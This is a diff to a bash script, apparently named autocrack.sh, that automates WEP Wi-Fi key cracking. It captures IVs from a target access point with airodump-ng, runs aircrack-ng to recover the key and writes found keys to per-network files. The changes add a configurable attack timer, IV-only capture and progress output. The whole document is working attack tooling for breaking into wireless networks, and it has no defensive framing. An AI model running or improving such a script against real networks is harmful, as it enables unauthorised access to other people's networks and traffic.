@@ -16,6 +16,7 @@ basefilename=$(basename "$0")
 #used to change working dir to the same as this script's
 DIR="$( cd "$( dirname "$0" )" && pwd )"
 WDIR=$DIR
+MASTER_TIMER=7200
 #
 #To go back to useing startaircrack change below to usestartaircrack="yes" 
 usestartaircrack="no" 
@@ -29,7 +30,7 @@ aircracktest=$(checkNeededFiles -q must aircrack-ng && echo yes )
 #Sets CLIENT_MAC to this computers mac address. I think that if you were to enter a fake mac it might work 
 #example - CLIENT_MAC="00:00:00:00:00"
 function setclientmac {
-	CLIENT_MAC=` ip link show $WIFI | tail -n 1 |  cut -f 6 -d " "`
+	CLIENT_MAC=$( ip link show $WIFI | tail -n 1 |  cut -f 6 -d " ")
 }
 basefilename2="autocrack.sh"
 #
@@ -44,6 +45,7 @@ while [ "$1" != "" ]
 do
 	case $1 in
 		-w) WDIR=$2;shift;;
+		-t) MASTER_TIMER=$2;shift;;
 	esac
 	shift
 done
@@ -264,7 +266,7 @@ function startthehack {
 	fi
 	#Opens airodump-ng on AP channel with a bssid filter in a new window to collect the new unique IVs
 	#xterm -fn fixed -geom +0-0 -title "Airodump: $AIRESSID" -e "airodump-ng -c $AIRCHANNEL --bssid $AIRBSSID -w output $WIFI & sleep 1h" &
-	airodump-ng -c $AIRCHANNEL --bssid $AIRBSSID -w output $WIFI >/dev/null 2>/dev/null &
+	airodump-ng -c $AIRCHANNEL --bssid $AIRBSSID -i -w output $WIFI >/dev/null 2>/dev/null &
 	echo "$!" >> tempSCANPID
 }
 # This function and the one above is startaircrack.sh's replacment
@@ -272,7 +274,7 @@ function startacracking {
 	AIRBSSID2=`echo "$AIRBSSID" | tr -d ":"`
 	#Starts aircrack
 	#xterm -fn fixed -geom -0-0 -title "Fake Authentication: $AIRESSID" -e "aircrack-ng -z -b $AIRBSSID output*.cap -l "$AIRESSID"/"$AIRESSID".key | tee lfkey"
-	aircrack-ng -z -b $AIRBSSID output*.cap -l "$AIRESSID"/"$AIRESSID".key | tee lfkey >/dev/null
+	aircrack-ng -z -b $AIRBSSID output*.ivs -l "$AIRESSID"/"$AIRESSID".key | tee lfkey >/dev/null
 	echo ""
 	for temppid in `cat tempSCANPID`; do kill $temppid > tempkillpid; done 2>/dev/null
 	echo "$AIRESSID" > "$AIRESSID"/key_for_"$AIRBSSID2".txt
@@ -451,7 +453,7 @@ echo 'echo "$AIRESSID" > "$AIRESSID"/key_for_"$AIRBSSID2".txt' >>startaircrack.s
 echo 'echo "mac; $AIRBSSID" >> "$AIRESSID"/key_for_"$AIRBSSID2".txt' >>startaircrack.sh
 echo 'read -p "Please wait "$(($AIRTIME/60))" minutes or press ENTER to skip the timer" -t $AIRTIME null' >>startaircrack.sh
 echo '#Starts aircrack' >>startaircrack.sh
-echo 'aircrack-ng -z -b $AIRBSSID output*.cap -l "$AIRESSID".key | tee lfkey' >>startaircrack.sh
+echo 'aircrack-ng -z -b $AIRBSSID output*.cap output*.ivs -l "$AIRESSID".key | tee lfkey' >>startaircrack.sh
 echo 'for temppid in `cat tempSCANPID`; do kill $temppid > tempkillpid; done 2>/dev/null' >>startaircrack.sh
 echo 'grep "KEY FOUND" lfkey >> "$AIRESSID"/key_for_"$AIRBSSID2".txt' >>startaircrack.sh
 echo 'if [ x$4 = x ]; then' >>startaircrack.sh
@@ -929,7 +931,7 @@ do
 			#Havent attacked this network, starting attack
 			tempkeyfound=""
 			rm tempauth 2>/dev/null
-			echo "========== Now attacking $AIRESSID =========="
+			echo "========== Now attacking $AIRESSID for ${MASTER_TIMER}s =========="
 			if [ x"$voice" = x"yes" ];then
 				echo "Now attacking $AIRESSID" > voicetempfile.txt
 				voiceisago
@@ -989,7 +991,7 @@ do
 				fi
 			fi
 			# Main output line 
-			echo -ne "IVs:${numberofIVs}|Beacons:${numberofpacketread}${numberofARPsent}${authenticatedyet}${rwecracking}\r"
+			echo -ne "[$timecounter/$MASTER_TIMER] IVs:${numberofIVs}|Beacons:${numberofpacketread}${numberofARPsent}${authenticatedyet}${rwecracking}\r"
 			timecounter=$((timecounter+1))
 			#Checks if the AP is still there
 			if [ x"$rangefinder" = x$((180)) ]; then 
@@ -1132,7 +1134,7 @@ do
 						fi
 				fi
 				fi
-				if [ x"$timecounter" = x$((3600)) ]; then #Master timer in seconds
+				if [ x"$timecounter" = x$((MASTER_TIMER)) ]; then #Master timer in seconds
 
 					testnumber0097=`cat output-01.*|grep "$AIRBSSID"|grep "WEP"|cut -f 11 -d ","| tr -d [:space:]`
 					sleep 22
